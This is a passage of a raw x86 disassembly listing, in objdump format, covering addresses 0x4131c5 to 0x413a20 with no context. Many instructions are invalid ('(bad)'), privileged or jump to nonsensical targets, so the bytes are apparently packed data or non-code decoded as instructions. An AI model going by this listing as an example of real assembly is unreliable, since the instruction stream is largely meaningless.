  4131c5:	loopne 0x413150
  4131c7:	lods   al,BYTE PTR ds:[esi]
  4131c8:	int3   
  4131c9:	inc    ebp
  4131ca:	mov    DWORD PTR gs:[eax+edi*8],eax
  4131ce:	add    al,0xc3
  4131d0:	sub    ecx,DWORD PTR [ebp+0x47]
  4131d3:	(bad)  
  4131d5:	shr    BYTE PTR [ebp-0x1f],0xe8
  4131d9:	add    eax,DWORD PTR [eax]
  4131db:	call   0x642f2e0
  4131e0:	add    esi,DWORD PTR [esi-0x3b2efc83]
  4131e6:	dec    esi
  4131e7:	ins    DWORD PTR es:[edi],dx
  4131e8:	in     al,dx
  4131e9:	lea    eax,[eax]
  4131eb:	inc    ebp
  4131ec:	inc    ebp
  4131ed:	sub    ecx,DWORD PTR [ebx-0x3eba1b73]
  4131f3:	or     DWORD PTR [ebx-0x38ff0400],0x398b4573
  4131fd:	and    al,0xdc
  4131ff:	ror    DWORD PTR [edx+0x24],0xf7
  413203:	or     BYTE PTR [ebp+0x4c],dh
  413206:	mov    ebx,DWORD PTR [eax+ebp*1-0x64]
  41320a:	stos   BYTE PTR es:[edi],al
  41320b:	adc    edx,edi
  41320d:	inc    esp
  41320e:	add    edi,DWORD PTR [eax]
  413210:	jne    0x4131f5
  413212:	mov    DWORD PTR [eax-0x7449db04],ecx
  413218:	cmp    ecx,DWORD PTR [edi]
  41321a:	sub    BYTE PTR [ebp-0x7e],dl
  41321d:	sar    ebp,0xb
  413220:	jmp    FWORD PTR [edi+0x2400392a]
  413226:	sub    esi,DWORD PTR [ebx-0x73]
  413229:	mov    esp,DWORD PTR [ecx+edi*4]
  41322c:	mov    ecx,DWORD PTR [eax]
  41322e:	and    BYTE PTR [eax],al
  413230:	jne    0x4131fc
  413232:	sub    ebp,ecx
  413234:	sbb    BYTE PTR [esi+0x32],ah
  413237:	dec    ebp
  413238:	push   ebp
  413239:	add    ecx,DWORD PTR [ebx+0x7d24fc8d]
  41323f:	ret    
  413240:	mov    edx,ebp
  413242:	leave  
  413243:	sub    DWORD PTR [esi+0x24],ebx
  413246:	ret    0x2b
  413249:	pop    ax
  41324b:	push   ebp
  41324c:	rol    BYTE PTR [ebx],0xeb
  41324f:	add    DWORD PTR [ecx+0x6c0001],0x40
  413256:	jb     0x4132ad
  413258:	ret    
  413259:	in     al,dx
  41325a:	jecxz  0x4131e7
  41325c:	push   esi
  41325d:	xchg   esp,eax
  41325e:	jne    0x413260
  413260:	cmp    edx,DWORD PTR [esi+0x1c]
  413263:	jne    0x413249
  413265:	mov    eax,DWORD PTR [ebp-0x77]
  413268:	ror    DWORD PTR [ebx+0x899408],0xe0
  41326f:	mov    esi,DWORD PTR [ebp-0x75]
  413272:	pop    esi
  413273:	nop
  413274:	mov    eax,DWORD PTR [eax]
  413276:	les    ecx,FWORD PTR [ecx-0x6b3e744a]
  41327c:	add    al,0x0
  41327e:	inc    ebp
  41327f:	mov    eax,DWORD PTR [ebx]
  413281:	mov    ebp,ebx
  413283:	cmp    al,0xf
  413285:	or     al,al
  413287:	inc    ebp
  413288:	inc    ebp
  413289:	xor    DWORD PTR [ebx+0x6c8bc89c],ecx
  41328f:	cld    
  413290:	add    BYTE PTR [edi+0x556c16c0],dh
  413296:	add    BYTE PTR [ecx-0x5],dl
  413299:	add    eax,0x17200
  41329e:	sbb    al,0x85
  4132a0:	dec    esp
  4132a1:	je     0x4132db
  4132a3:	mov    esp,DWORD PTR [eax+ecx*8+0x20]
  4132a7:	add    BYTE PTR [ebx],bh
  4132a9:	(bad)  
  4132aa:	and    al,0x30
  4132ac:	jae    0x41324a
  4132ae:	mov    cl,cl
  4132b0:	inc    DWORD PTR [esp]
  4132b3:	push   ebp
  4132b4:	shr    esp,0x8
  4132b7:	in     al,dx
  4132b8:	push   esp
  4132b9:	add    DWORD PTR [eax],esp
  4132bb:	add    bl,cl
  4132bd:	inc    ebp
  4132be:	mov    bh,0x53
  4132c0:	add    BYTE PTR [ebp-0x17],al
  4132c3:	push   esi
  4132c4:	cmovne ecx,edx
  4132c7:	xor    BYTE PTR [esp+ebx*4+0x20],cl
  4132cb:	push   edi
  4132cc:	pop    ss
  4132cd:	xor    ecx,ebx
  4132cf:	pushf  
  4132d0:	add    BYTE PTR [ecx+0x452bf800],cl
  4132d6:	rcr    ecx,0x5
  4132d9:	inc    ebp
  4132da:	add    esp,ebx
  4132dc:	add    BYTE PTR [ebp-0x40],al
  4132df:	out    0x6c,eax
  4132e1:	inc    ebp
  4132e2:	inc    eax
  4132e3:	sub    eax,0x450547c1
  4132e8:	dec    esp
  4132e9:	and    BYTE PTR cs:[ebp-0x27],al
  4132ed:	jo     0x413318
  4132ef:	leave  
  4132f0:	add    BYTE PTR [esi+0xc000c0],bh
  4132f6:	lea    eax,[esp-0x40]
  4132fa:	ret    
  4132fb:	mov    dh,0x8b
  4132fd:	xor    edx,DWORD PTR [ecx+0x3]
  413300:	mov    al,BYTE PTR [ecx+0x1]
  413303:	sbb    BYTE PTR [eax],al
  413305:	stc    
  413306:	mov    esi,DWORD PTR [edx+0x8]
  413309:	(bad)  
  41330a:	ss mov eax,0xb98ac631
  413310:	add    esi,eax
  413312:	add    BYTE PTR [edx-0x444d39f7],bh
  413318:	add    esi,eax
  41331a:	add    BYTE PTR [esi+ecx*1+0x1bd82c6],bh
  413321:	mov    BYTE PTR [eax],0xbe
  413324:	or     BYTE PTR [ebx],dh
  413326:	dec    ecx
  413327:	lea    eax,[ebx]
  413329:	or     eax,0x18fc0fc7
  41332e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41332f:	(bad)  
  413331:	fiadd  WORD PTR [ebp-0x78]
  413334:	jae    0xed763a83
  41333a:	or     BYTE PTR [ebp+0x7],al
  41333d:	in     eax,dx
  41333e:	pushf  
  41333f:	inc    ebp
  413340:	xor    bl,al
  413342:	pop    esi
  413343:	inc    ebp
  413344:	shl    esp,0xc
  413347:	inc    ebp
  413348:	sub    cl,0x1
  41334b:	inc    ebp
  41334c:	add    bh,bl
  41334e:	add    BYTE PTR [ebp-0x7b],al
  413351:	loopne 0x41334b
  413353:	inc    ebp
  413354:	ret    0xe7
  413357:	inc    ebp
  413358:	mov    esi,DWORD PTR [eax-0x7f]
  41335b:	leave  
  41335c:	and    al,0x44
  41335e:	add    BYTE PTR [eax+0x331cb68b],dh
  413364:	mov    DWORD PTR [ebx],eax
  413366:	sbb    al,0x41
  413368:	(bad)  
  413369:	sbb    al,ah
  41336b:	stc    
  41336c:	test   DWORD PTR [edx-0x8],esi
  41336f:	lea    edi,[edi-0x7007a98]
  413375:	mov    DWORD PTR [ebp-0x2c],edi
  413378:	(bad)  
  413379:	dec    ebp
  41337a:	sar    BYTE PTR [eax+0x71c1fcc6],0xc6
  413381:	add    edx,eax
  413383:	(bad)  
  413384:	(bad)  
  413385:	inc    ebx
  413387:	jmp    FWORD PTR [edx-0x38]
  41338a:	(bad)  
  41338b:	or     al,ah
  41338d:	jge    0x413355
  41338f:	mov    ebp,0x5a8533e4
  413395:	clc    
  413396:	leave  
  413397:	inc    ebp
  413398:	add    BYTE PTR [ebx+0xd8c8d],cl
  41339e:	rdpmc  
  4133a0:	sbb    BYTE PTR [edi+0x7de08da],bh
  4133a6:	mov    BYTE PTR [ebx+eax*4-0x12c6f9ce],bl
  4133ad:	cmovne edx,ebx
  4133b0:	jmp    0x4133b2
  4133b2:	inc    ebp
  4133b3:	mov    ebp,ebp
  4133b5:	sbb    al,0x45
  4133b7:	mov    ebx,ebx
  4133b9:	add    DWORD PTR [ebp+0x0],eax
  4133bc:	out    dx,al
  4133bd:	add    DWORD PTR [ebp+0x4d],eax
  4133c0:	sub    eax,0x2e80458b
  4133c5:	add    BYTE PTR [ebp-0x77],al
  4133c8:	jo     0x413434
  4133ca:	leave  
  4133cb:	mov    DWORD PTR [esp+ecx*8-0x48],0x33e9b6d8
  4133d3:	inc    ebp
  4133d4:	add    ebx,edi
  4133d6:	inc    ecx
  4133d7:	out    0x18,eax
  4133d9:	(bad)  
  4133da:	stc    
  4133db:	int3   
  4133dc:	jb     0x413368
  4133de:	(bad)  
  4133df:	xor    dh,BYTE PTR [eax-0x4ec83980]
  4133e5:	or     dh,al
  4133e7:	dec    esi
  4133e8:	mov    dl,0xf3
  4133ea:	mov    BYTE PTR [ebp-0x4d],0x89
  4133ee:	(bad)  
  4133ef:	loopne 0x4133a5
  4133f1:	inc    esi
  4133f3:	lea    esi,[ebp-0x49003924]
  4133f9:	push   eax
  4133fa:	mov    BYTE PTR [ebp-0x49],0x33
  4133fe:	xor    eax,DWORD PTR [ebx]
  413400:	lea    edx,[eax+0xd]
  413403:	inc    ebp
  413404:	jae    0x8c1b9a22
  41340a:	ficomp WORD PTR [eax+ecx*4]
  41340d:	add    BYTE PTR [ebx-0x12fff7ff],0x85
  413414:	test   esi,edi
  413416:	(bad)  
  413417:	(bad)  
  413418:	inc    DWORD PTR [eax]
  41341a:	inc    ebp
  41341b:	add    BYTE PTR [ebx-0x10aa2bd0],cl
  413421:	test   DWORD PTR [ebx],edx
  413423:	jne    0x4133ae
  413425:	or     DWORD PTR [ebx-0xed9771],0x75703b8c
  41342f:	jmp    0x12534bd
  413434:	inc    ebp
  413435:	jne    0x413419
  413437:	mov    DWORD PTR [eax+eiz*8+0x331cff8b],ebx
  41343e:	mov    BYTE PTR [ebp+0x45009c01],cl
  413444:	shl    BYTE PTR [eax],0x55
  413447:	push   cx
  413449:	mov    bx,0x7245
  41344d:	gs add bh,al
  413450:	add    DWORD PTR [ebp+eax*4+0xd801df],ebx
  413457:	inc    ebp
  413458:	dec    ebp
  413459:	into   
  41345a:	mov    esp,ebx
  41345c:	jl     0x413425
  41345e:	add    BYTE PTR [ecx+ecx*4+0x1ce48bdb],ah
  413465:	inc    ebp
  413466:	mov    edi,ebx
  413468:	add    ebp,esp
  41346a:	add    BYTE PTR [esi+0x1],ah
  41346d:	inc    ebp
  41346e:	or     BYTE PTR [edi],bh
  413470:	inc    ebp
  413471:	(bad)  
  413472:	in     eax,dx
  413473:	fsubr  st(4),st
  413475:	inc    edi
  413477:	add    dl,al
  413479:	add    al,ah
  41347b:	call   0x864cf0
  413480:	pop    esi
  413481:	test   DWORD PTR [eax],ecx
  413483:	dec    dl
  413485:	(bad)  
  413486:	jmp    0x413fbd10
  41348b:	push   DWORD PTR [ebp-0x75]
  41348e:	(bad)  
  41348f:	loopne 0x41345d
  413491:	mov    DWORD PTR [ebp-0x74013d],0xfec0851c
  41349b:	push   eax
  41349c:	inc    DWORD PTR [ebp-0x75]
  41349f:	mov    esp,eax
  4134a1:	cwde   
  4134a2:	mov    DWORD PTR [eax],0xff8bffc3
  4134a8:	sbb    al,0x8
  4134aa:	ror    BYTE PTR [ebp+0x50],0x51
  4134ae:	inc    ebp
  4134af:	ror    BYTE PTR [ebx+0x65987d],1
  4134b5:	test   edi,eax
  4134b7:	add    al,0xdc
  4134b9:	add    bh,bh
  4134bb:	push   0x1
  4134bd:	add    BYTE PTR [eax],al
  4134bf:	mov    edi,edi
  4134c1:	inc    WORD PTR [ebp+0x8]
  4134c5:	add    eax,0xd
  4134c8:	(bad)  
  4134ca:	xor    eax,0x782ec89
  4134cf:	push   ecx
  4134d0:	cli    
  4134d1:	popw   es
  4134d3:	push   ebp
  4134d4:	xchg   BYTE PTR [ebx-0x76740800],al
  4134da:	sbb    al,0x86
  4134dc:	test   DWORD PTR [ecx-0x2],edx
  4134df:	call   WORD PTR [ebp-0x40]
  4134e3:	adc    DWORD PTR [ebp-0x5],0xffffffc7
  4134e7:	mov    eax,ebx
  4134e9:	mov    dh,BYTE PTR ds:0xc7666851
  4134ef:	push   ebp
  4134f0:	fsub   QWORD PTR [esi+0x0]
  4134f3:	dec    ebp
  4134f4:	inc    ebp
  4134f5:	mov    edx,0xec4ec0
  4134fa:	(bad)  
  4134fb:	retf   0x89a0
  4134fe:	fist   DWORD PTR [eax+0x454ae1]
  413504:	jmp    0xa8b5:0xc7663e8b
  41350b:	jmp    edx
  41350d:	(bad)  
  41350e:	in     eax,dx
  41350f:	lock (bad) 
  413511:	mov    DWORD PTR [esi+ebp*2-0x727a0090],ebp
  413518:	(bad)  
  413519:	xor    eax,0x700089ff
  41351e:	add    bh,bh
  413520:	stos   DWORD PTR es:[edi],eax
  413521:	data16 add BYTE PTR [ebp-0x1b0077],al
  413528:	inc    DWORD PTR [ecx-0x73]
  41352b:	data16 fadd QWORD PTR [ebp-0xaf0001]
  413532:	inc    ebp
  413533:	shl    BYTE PTR [ebx],0x66
  413536:	add    eax,DWORD PTR [ebp-0xba00b0]
  41353c:	add    DWORD PTR [ecx+0x44],0x66
  413540:	mov    eax,DWORD PTR [ebp-0x7f00e4]
  413546:	add    DWORD PTR [ecx-0xcf8600],ecx
  41354c:	push   ebp
  41354d:	lea    dx,[ebp-0x28]
  413554:	add    BYTE PTR [ebp-0x25],0xf
  413558:	jge    0xff42345f
  41355e:	mov    ecx,0xc34fc7
  413563:	rol    ecx,0x89
  413566:	mov    DWORD PTR [eax+eax*4-0x1],ebp
  41356a:	ror    BYTE PTR [ebx-0x48990775],0x55
  413571:	or     BYTE PTR [ebp-0x763c0a39],0xc1
  413578:	test   BYTE PTR [ecx-0x3f997f3e],cl
  41357e:	push   ebp
  41357f:	mov    DWORD PTR [ebp-0x76761480],ecx
  413585:	or     BYTE PTR [eax+0x6600c265],0x45
  41358c:	push   ebp
  41358d:	xor    DWORD PTR [ebp-0x76381e64],ecx
  413593:	aam    0x8c
  413595:	test   DWORD PTR [ecx-0x3dba7108],ecx
  41359b:	cmp    eax,0xc78b9c00
  4135a0:	data16 hlt 
  4135a2:	dec    ebp
  4135a3:	test   DWORD PTR [ecx+0x454ff8],edi
  4135a9:	xor    ecx,esi
  4135ab:	lahf   
  4135ac:	mov    DWORD PTR [ebx-0x7f00e394],ecx
  4135b2:	mov    eax,DWORD PTR [ecx]
  4135b4:	data16 add BYTE PTR [ebp-0x7400bb],dh
  4135bb:	sbb    al,0x71
  4135bd:	dec    ebp
  4135be:	mov    si,WORD PTR [ebp-0xff0074]
  4135c5:	mov    ecx,DWORD PTR [ecx-0x6f8d75]
  4135cb:	add    BYTE PTR [ebp-0x760fd477],cl
  4135d1:	jne    0x413647
  4135d3:	test   edi,edi
  4135d5:	jne    0x41355a
  4135d7:	(bad)  
  4135d8:	sti    
  4135d9:	sbb    BYTE PTR [ecx-0x1789ab],cl
  4135df:	cld    
  4135e0:	(bad)  
  4135e1:	jmp    DWORD PTR [ecx]
  4135e3:	inc    ebp
  4135e4:	mov    DWORD PTR [ebx+0x3ff8b78],ecx
  4135ea:	data16 cmp al,0x8d
  4135ed:	push   cs
  4135ee:	inc    DWORD PTR [ebp-0x1]
  4135f1:	test   DWORD PTR [ecx-0x838c],ecx
  4135f7:	sbb    al,0x8b
  4135f9:	lock clc 
  4135fb:	push   DWORD PTR [edi-0xe39375]
  413601:	xor    BYTE PTR [ebx],0x1
  413604:	add    eax,DWORD PTR [eax]
  413606:	xor    eax,DWORD PTR [eax]
  413608:	mov    WORD PTR [ebp-0xba003d],0x4575
  413611:	mov    ecx,DWORD PTR [edi]
  413613:	sbb    al,0x4d
  413615:	mov    DWORD PTR [ebx],esi
  413617:	add    DWORD PTR [ebx],eax
  413619:	add    BYTE PTR [ebx],dh
  41361b:	xor    DWORD PTR [esi-0x80],esp
  41361e:	inc    ebp
  41361f:	add    DWORD PTR [ebx],esi
  413621:	add    BYTE PTR [esi+0x50],ah
  413624:	inc    ebp
  413625:	jmp    0x863890
  41362a:	add    DWORD PTR [eax+0xc70194],0xffffffec
  413631:	or     BYTE PTR [ebp+0x4501f845],dh
  413637:	jmp    0xdd392d
  41363c:	(bad)  
  41363d:	push   cs
  41363e:	in     al,0xc9
  413640:	test   DWORD PTR [ebp+0x4502f8],eax
  413646:	xor    ecx,DWORD PTR [ebp-0x64]
  413649:	mov    eax,edi
  41364b:	mov    esp,esp
  41364d:	push   eax
  41364e:	add    eax,0x45fff885
  413653:	dec    DWORD PTR [ebx+0x339445]
  413659:	add    ecx,DWORD PTR [ecx+0x452ce889]
  41365f:	dec    DWORD PTR [ebx-0x4e0be375]
  413665:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413666:	add    edi,edi
  413668:	add    bh,bh
  41366a:	push   cs
  41366b:	xor    eax,DWORD PTR [eax+0x890103]
  413671:	xor    BYTE PTR [ebp-0x1],al
  413674:	mov    DWORD PTR [ebp-0x36df38],ecx
  41367a:	push   cs
  41367b:	push   eax
  41367c:	jne    0x4136c3
  41367e:	mov    esi,DWORD PTR [ebx]
  413680:	sbb    al,0x3
  413682:	jne    0x4136d4
  413684:	inc    DWORD PTR [ebp-0x75]
  413687:	add    eax,0x800f0
  41368c:	add    BYTE PTR [ebx-0x7f74e3bf],cl
  413692:	mov    DWORD PTR [ecx],eax
  413694:	sbb    BYTE PTR [eax],al
  413696:	leave  
  413697:	test   DWORD PTR [edi-0x1],eax
  41369a:	jne    0x41369b
  41369c:	call   0xff4221a1
  4136a1:	xor    BYTE PTR [ebp+0x4d],al
  4136a4:	mov    edi,edi
  4136a6:	enter  0x8,0x4d
  4136aa:	mov    ecx,DWORD PTR [ebx-0x17fc74cd]
  4136b0:	mov    eax,DWORD PTR [eax]
  4136b2:	sbb    al,0x1
  4136b4:	sbb    DWORD PTR [ebp+0x4d],eax
  4136b7:	mov    DWORD PTR [ebx+0x18cc8b],ecx
  4136bd:	inc    eax
  4136be:	dec    DWORD PTR [ecx-0x27d775]
  4136c4:	add    BYTE PTR [ebx-0x38d72b01],cl
  4136ca:	xchg   ecx,eax
  4136cb:	ret    
  4136cc:	add    BYTE PTR [ebp-0x830075],al
  4136d2:	add    BYTE PTR [ebp-0x75],al
  4136d5:	mov    DWORD PTR [ebp+0x8ff0430],ecx
  4136db:	lea    edi,[edi+0x20]
  4136de:	add    bh,bh
  4136e0:	mov    edx,DWORD PTR [eax-0x7b]
  4136e3:	inc    ebp
  4136e4:	rdpmc  
  4136e6:	jne    0x4136eb
  4136e8:	add    BYTE PTR [eax-0x75],dl
  4136eb:	inc    ebp
  4136ec:	call   0x40413ff6
  4136f1:	add    BYTE PTR [ecx-0xe3d775],cl
  4136f7:	or     BYTE PTR [ebx-0x38ff13ff],0x85
  4136fe:	ret    
  4136ff:	inc    DWORD PTR [ebp-0xff0001]
  413705:	add    BYTE PTR [ebp-0x4b],al
  413708:	cmp    edi,0x24
  41370b:	(bad)  
  41370c:	push   DWORD PTR [eax]
  41370e:	add    BYTE PTR [ebp-0x39],dl
  413711:	test   ebx,eax
  413713:	je     0x41369a
  413715:	mov    edi,edi
  413717:	sbb    bh,bh
  413719:	test   DWORD PTR gs:[eax],eax
  41371c:	(bad)  
  41371d:	js     0x41371e
  41371f:	add    BYTE PTR [ebx-0x38b21fdd],cl
  413725:	sub    eax,ebx
  413727:	mov    ecx,DWORD PTR [ebx-0x5513e377]
  41372d:	add    eax,DWORD PTR [eax]
  41372f:	dec    ebp
  413730:	push   eax
  413731:	mov    al,BYTE PTR [ebp+0x1]
  413734:	mov    eax,DWORD PTR [ebp-0x68]
  413737:	mov    eax,DWORD PTR [eax]
  413739:	cld    
  41373a:	(bad)  
  41373b:	or     BYTE PTR [eax],ah
  41373d:	dec    ebp
  41373e:	inc    DWORD PTR [eax+0x4]
  413741:	push   ecx
  413742:	add    BYTE PTR [edx-0x1],dh
  413745:	mov    ecx,DWORD PTR [ecx+0x55cef83c]
  41374b:	or     DWORD PTR [ebx-0xfff3800],0x8b5545d6
  413755:	add    ecx,DWORD PTR [ecx-0xf037477]
  41375b:	push   ecx
  41375c:	xor    BYTE PTR [ebx],al
  41375e:	inc    ebp
  41375f:	mov    DWORD PTR [ebx-0x7aaaafe8],ecx
  413765:	(bad)  
  413766:	push   eax
  413768:	inc    DWORD PTR [eax]
  41376a:	inc    ebp
  41376b:	add    BYTE PTR [ebx],dh
  41376d:	add    BYTE PTR [ebx],0x0
  413770:	mov    DWORD PTR [ebx-0x150007d4],eax
  413776:	lea    edx,[ebp-0x6c]
  413779:	je     0x413700
  41377b:	(bad)  
  41377c:	dec    DWORD PTR [eax]
  41377e:	call   DWORD PTR [ebp-0x7b]
  413781:	mov    edi,edi
  413783:	hlt    
  413784:	call   DWORD PTR [ebp-0x75]
  413787:	mov    esp,eax
  413789:	cwde   
  41378a:	(bad)  
  41378b:	mov    bh,0xc3
  41378d:	mov    DWORD PTR [ebx-0x1100e39c],ecx
  413793:	add    DWORD PTR [eax],0x450050ff
  413799:	mov    DWORD PTR [ebx+0x9598c8],ecx
  41379f:	inc    edi
  4137a1:	jmp    DWORD PTR [eax]
  4137a3:	jmp    0xcd00:0x640481ff
  4137aa:	mov    DWORD PTR [ebx],esi
  4137ac:	and    al,0x81
  4137ae:	push   DWORD PTR [edx]
  4137b0:	call   FWORD PTR [edi+edi*8-0x3f74f78b]
  4137b7:	add    esi,DWORD PTR [eax]
  4137b9:	enter  0x3c45,0x83
  4137bd:	add    ah,bh
  4137bf:	adc    DWORD PTR [ebx+0x768b5055],eax
  4137c5:	add    ecx,DWORD PTR [ebx-0x31ba07cf]
  4137cb:	mov    esi,eax
  4137cd:	xor    BYTE PTR [ebp+0x45],cl
  4137d0:	jmp    0x41375d
  4137d2:	mov    ebx,DWORD PTR [eax]
  4137d4:	in     al,dx
  4137d5:	inc    ebp
  4137d6:	or     al,0x2
  4137d8:	dec    DWORD PTR [ebp-0x4]
  4137db:	jne    0x413832
  4137dd:	mov    ecx,DWORD PTR [eax+0x18558be8]
  4137e3:	mov    edi,DWORD PTR [ebx]
  4137e5:	lock push eax
  4137e7:	xchg   ecx,eax
  4137e8:	jmp    0x34185ed
  4137ed:	adc    al,0x8b
  4137ef:	inc    ebp
  4137f0:	mov    al,ds:0x8b04008b
  4137f5:	push   ebp
  4137f6:	sub    ecx,DWORD PTR [ecx-0x2d391308]
  4137fc:	push   ebp
  4137fd:	test   DWORD PTR [ebx-0x2900d701],ecx
  413803:	inc    ebp
  413804:	dec    ebp
  413805:	mov    DWORD PTR [ecx+0x45ffe424],ecx
  41380b:	mov    DWORD PTR [eax],0xe9ff0020
  413811:	add    al,0x0
  413813:	add    BYTE PTR [eax],al
  413815:	mov    eax,edx
  413817:	push   eax
  413818:	rol    DWORD PTR [ebp-0xb0077],1
  41381e:	bound  eax,QWORD PTR [ebp+0x50]
  413821:	xor    ecx,DWORD PTR [ecx+0x55899803]
  413827:	sub    al,0x89
  413829:	push   esp
  41382b:	lea    edx,[ebp-0x6c]
  41382e:	jne    0xffd73746
  413834:	inc    DWORD PTR [ebp-0x1d0001]
  41383a:	jnp    0xc7971840
  413840:	mov    eax,ebx
  413842:	fs mov edi,edi
  413845:	sbb    al,0xc1
  413847:	out    dx,al
  413848:	or     al,0x0
  41384a:	ret    0x8d50
  41384d:	inc    ebp
  41384e:	dec    DWORD PTR [ebx+0xfa98d7]
  413854:	test   edi,edi
  413856:	clc    
  413857:	call   FWORD PTR [edi]
  413859:	or     BYTE PTR [eax],cl
  41385b:	inc    ebp
  41385c:	dec    ebp
  41385d:	inc    DWORD PTR [ebx+0x74803114]
  413863:	add    DWORD PTR [ebx+0x45fc00],ecx
  413869:	call   DWORD PTR [eax+edx*1]
  41386c:	add    ecx,DWORD PTR [ebp-0x38]
  41386f:	push   esi
  413870:	adc    al,0x8
  413872:	mov    edx,DWORD PTR [ebp-0x14]
  413875:	mov    ecx,DWORD PTR [ebp-0x4]
  413878:	add    DWORD PTR [ebp-0x68],0xffffff8d
  41387c:	inc    DWORD PTR [esp+esi*8]
  41387f:	inc    ebp
  413880:	stos   BYTE PTR es:[edi],al
  413881:	mov    edx,DWORD PTR [ebp+0x1c]
  413884:	add    DWORD PTR [ebp-0x10],eax
  413887:	mov    edx,DWORD PTR [ebp-0x70]
  41388a:	cmp    eax,DWORD PTR [eax]
  41388c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41388d:	mov    eax,DWORD PTR [eax]
  41388f:	sbb    al,0x73
  413891:	add    BYTE PTR [ebx],0x1
  413894:	call   0x89718899
  413899:	xor    eax,ebp
  41389b:	pop    ds
  41389c:	inc    ebp
  41389d:	xor    al,BYTE PTR [ebp+0x6f760f3a]
  4138a3:	(bad)  
  4138a4:	push   DWORD PTR [edi]
  4138a6:	mov    ecx,DWORD PTR [ebx+0x398503f8]
  4138ac:	push   DWORD PTR [ebx-0x1]
  4138af:	mov    eax,DWORD PTR [ebp-0x740075]
  4138b5:	sub    eax,DWORD PTR [eax]
  4138b7:	add    eax,DWORD PTR [eax]
  4138b9:	mov    DWORD PTR [ecx+0x5f],eax
  4138bc:	mov    DWORD PTR [ebx+0x28],ebx
  4138bf:	ret    0xff
  4138c2:	mov    ecx,DWORD PTR [ebx+0x1cc783d4]
  4138c8:	ret    
  4138c9:	mov    eax,DWORD PTR [ebp-0x6f0075]
  4138cf:	add    BYTE PTR [ebp-0x7d],al
  4138d2:	mov    DWORD PTR [eax],eax
  4138d4:	xor    BYTE PTR [edi+edi*8+0x20008d01],al
  4138db:	sar    bh,cl
  4138dd:	test   BYTE PTR [eax+0x1],dl
  4138e0:	inc    ebp
  4138e1:	add    BYTE PTR [ebx],dh
  4138e3:	test   BYTE PTR [ebx],0x84
  4138e6:	push   eax
  4138e7:	add    BYTE PTR [ebp+0x0],al
  4138ea:	add    eax,0x86
  4138ef:	add    BYTE PTR [ebx-0x7f7be340],cl
  4138f5:	add    BYTE PTR [ecx],al
  4138f7:	add    BYTE PTR [eax],al
  4138f9:	mov    esi,0x550030
  4138fe:	mov    ecx,DWORD PTR [edi]
  413900:	sbb    al,0xda
  413902:	jne    0x413904
  413904:	mov    edi,DWORD PTR [ecx]
  413906:	xor    BYTE PTR [eax+eax*1],0x84
  41390a:	add    eax,DWORD PTR [eax]
  41390c:	cld    
  41390d:	add    BYTE PTR [ebp-0x4f],dh
  413910:	mov    eax,DWORD PTR [ecx]
  413912:	cld    
  413913:	add    BYTE PTR [ecx-0x1bff009b],cl
  413919:	retf   0xe45
  41391c:	add    eax,edx
  41391e:	sbb    al,0xb7
  413920:	dec    ebp
  413921:	or     al,0x89
  413923:	dec    ebp
  413924:	sbb    al,0xf
  413926:	inc    ebp
  413927:	dec    eax
  413928:	mov    eax,DWORD PTR [ebx]
  41392a:	sbb    al,0xf
  41392c:	nop
  41392d:	scas   al,BYTE PTR es:[edi]
  41392e:	add    DWORD PTR [eax],eax
  413930:	add    BYTE PTR [ebp-0x7674ebbb],cl
  413936:	mov    eax,gs
  413938:	add    bh,bh
  41393a:	mov    edi,edi
  41393c:	cmp    DWORD PTR [edi+0x72],edx
  41393f:	xor    DWORD PTR [ebx-0x74ee7481],ecx
  413945:	gs cmp al,0x0
  413948:	je     0x413920
  41394a:	push   eax
  41394b:	sar    BYTE PTR [eax],1
  41394d:	mov    bh,0x3e
  41394f:	push   cs
  413950:	cmp    DWORD PTR [edi-0x4cff3f4],esi
  413956:	add    DWORD PTR [ecx+0x12],ebp
  413959:	dec    edx
  41395a:	(bad)  
  41395b:	mov    eax,edx
  41395d:	in     al,dx
  41395e:	adc    DWORD PTR [ecx],esi
  413960:	pop    esi
  413961:	inc    ecx
  413962:	leave  
  413963:	or     DWORD PTR [eax],ebx
  413965:	gs push ebp
  413967:	add    ah,ch
  413969:	into   
  41396a:	in     al,dx
  41396b:	enter  0xb756,0xf0
  41396f:	push   cs
  413970:	xor    DWORD PTR [edi-0x4fff3ff],0x790f2b38
  41397a:	or     cl,BYTE PTR [ecx+0x7d85fc00]
  413980:	jnp    0x7441be88
  413986:	test   DWORD PTR [ebx+0x1cfae40f],ecx
  41398c:	add    BYTE PTR [edi],cl
  41398e:	mov    edi,DWORD PTR [ecx-0x78]
  413991:	ltr    WORD PTR [ecx-0x7b]
  413995:	dec    DWORD PTR [edi]
  413997:	clc    
  413998:	out    0x45,eax
  41399a:	add    BYTE PTR [eax],cl
  41399c:	cmp    ebx,0xffffff8c
  41399f:	jge    0x4139a1
  4139a1:	jb     0x4139b3
  4139a3:	je     0x503a23
  4139a9:	pop    edx
  4139aa:	push   esi
  4139ab:	mov    ecx,DWORD PTR [edi]
  4139ad:	in     al,dx
  4139ae:	rol    DWORD PTR [ebp+0x0],1
  4139b1:	or     DWORD PTR [ebx+0xfb8c08],0x4d
  4139b8:	cmp    DWORD PTR [ecx],0xfffffff0
  4139bb:	hlt    
  4139bc:	mov    esp,DWORD PTR [eax+0xf034d2b]
  4139c2:	(bad)  
  4139c4:	push   eax
  4139c5:	jns    0xb8411e43
  4139cb:	lock push cs
  4139cd:	ror    edx,0x3
  4139d0:	test   BYTE PTR [ecx+0x5500e800],cl
  4139d6:	dec    eax
  4139d7:	rcpps  xmm4,XMMWORD PTR [ecx+0x4d]
  4139db:	(bad)  
  4139dc:	mov    esi,0x7f33ff5f
  4139e1:	inc    eax
  4139e2:	test   DWORD PTR [edx],eax
  4139e4:	je     0x4139a6
  4139e6:	mov    ecx,ecx
  4139e8:	adc    DWORD PTR [ebp-0xc],0xffffffec
  4139ec:	and    eax,DWORD PTR [eax+0xf0103]
  4139f2:	jp     0x4139e0
  4139f4:	rcpps  xmm3,XMMWORD PTR [edx-0x25]
  4139f8:	add    edx,DWORD PTR [edi+0x74]
  4139fb:	sbb    BYTE PTR [ebp+0x4d001484],cl
  413a01:	add    BYTE PTR [ebp-0x74c48bbb],al
  413a07:	je     0x41398c
  413a09:	cmp    eax,edi
  413a0b:	js     0x413a30
  413a0d:	add    eax,0xeb0fc003
  413a12:	jns    0x41399f
  413a14:	vmread DWORD PTR [ecx+0x45],ebx
  413a18:	add    ecx,DWORD PTR [ebx+0x508d1c74]
  413a1e:	adc    al,0x8b
  413a20:	jge    0x413a36
